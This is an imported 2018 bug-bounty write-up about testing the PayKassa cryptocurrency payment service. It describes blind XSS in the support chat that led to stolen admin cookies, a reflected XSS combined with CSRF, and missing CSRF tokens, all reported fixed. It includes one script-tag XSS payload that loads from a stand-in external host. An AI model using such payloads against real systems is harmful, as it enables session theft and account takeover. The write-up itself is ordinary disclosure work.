---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-03-31_how-i-hacked-one-cryptocurrency-service.md
original_filename: 2018-03-31_how-i-hacked-one-cryptocurrency-service.md
title: How I hacked one cryptocurrency service
category: documents
detected_topics:
- xss
- command-injection
- otp
- csrf
- api-security
tags:
- imported
- documents
- xss
- command-injection
- otp
- csrf
- api-security
language: en
raw_sha256: d7b4be29629bc994e4a4acb2299191485e465e343a27c94ae8cd49a8fa9a66b1
text_sha256: e6d882476c5da4036cfaeea570f794211283e8165c3e298e62448843d54db176
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# How I hacked one cryptocurrency service

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-03-31_how-i-hacked-one-cryptocurrency-service.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, csrf, api-security
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `d7b4be29629bc994e4a4acb2299191485e465e343a27c94ae8cd49a8fa9a66b1`
- Text SHA256: `e6d882476c5da4036cfaeea570f794211283e8165c3e298e62448843d54db176`


## Content

---
title: "How I hacked one cryptocurrency service"
url: "https://medium.com/@valeriyshevchenko/how-i-hacked-one-cryptocurrency-service-db3cb0f81d6c"
authors: ["Valeriy Shevchenko (@Krevetk0Valeriy)"]
programs: ["PayKassa"]
bugs: ["Blind XSS", "Reflected XSS", "CSRF"]
bounty: "300"
publication_date: "2018-03-31"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5938
scraped_via: "browseros"
---

# How I hacked one cryptocurrency service

How I hacked one cryptocurrency service
Valeriy Shevchenko
Follow
3 min read
·
Apr 1, 2018

205

1

A couple of weeks ago one morning began not as usual.

Message: — “Is it your article?(article about one hacking story) Do you want to check our service?”
As a result, after several messages in the telegram, I was on a way to start Recon, to check new service. The service name was paykassa.pro.

It's payment provider service almost for cryptocurrencies. And yes, it was official request without bug-bounty routine, long time for fixing, claiming about reward amount and so on.

Testing session was interesting. And i am here to share with you my findings.

Blind XSS in support chat (fixed)

First of all i checked case with support chats. It was two support areas. One with widget and second with official request from profile menu. Second rout was successed. I found how to use XSS with attached file from filename and from title.

Press enter or click to view image in full size

Also it was the biggest impact here because guys from support send to me this smile ;) and it was good to me. Because i caught his cookies → url to admin menu → at the end I can control service from admin tool with this caught cookies.

For XSS I used this vector ( always collect my logs with xsshunter.com )

“><script src=https://xss-target-example.com></script>

Get Valeriy Shevchenko’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

And the result was — Powerful Admin Menu

Press enter or click to view image in full size

2. XSS attack from interesting directory (fixed)

Under the Recon process i found interesting directory https://paykassa.pro/info.php

This page has one form which provide to sent POST request to the main service. Service returned to use time to time some data

first of all it's unrestricted access to the service data
second- it's place where some data was reflected on the page

Attacker can craft malicious page with XSS+CSRF vector to steal victim cookies on this page from reflected parameter.

Press enter or click to view image in full size

3. CSRF attack on user settings (fixed)

On the personal page of my test user i found that there is no CSRF tokens which provide for me unique request for saving private data. I checked it with two different users. And my theory was right. First user with using malicious crafted page can modify data for second user.

Timeline for fixing was around 1–2 hours every time. That was great!

Reward amount was around 300$. For me, money does not play an important role. That's why project didn't scare me.

PS: You can contact with me if you have interesting project for testing.

Click "Clap" icon if you like this article ;)
